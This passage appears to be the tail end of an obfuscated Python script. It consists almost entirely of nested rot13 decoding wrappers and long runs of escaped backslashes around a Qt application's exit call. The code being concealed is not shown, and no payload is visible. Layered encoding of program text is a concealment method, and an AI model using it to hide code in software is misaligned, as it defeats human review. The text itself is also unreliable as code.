sys.exit(app.exec())\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\a\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\',__))("ebg_13",__vzcbeg__(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'pbqrpf\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\').qrpbqr))\\\\\\\\\\\\\\\',__))("rot_13",__import__(\\\\\\\\\\\\\\\'codecs\\\\\\\\\\\\\\\').decode))\\\\\\\',__))("ebg_13",__vzcbeg__(\\\\\\\'pbqrpf\\\\\\\').qrpbqr))\\\',__))("rot_13",__import__(\\\'codecs\\\').decode))\',__))("ebg_13",__vzcbeg__(\'pbqrpf\').qrpbqr))',__))("rot_13",__import__('codecs').decode))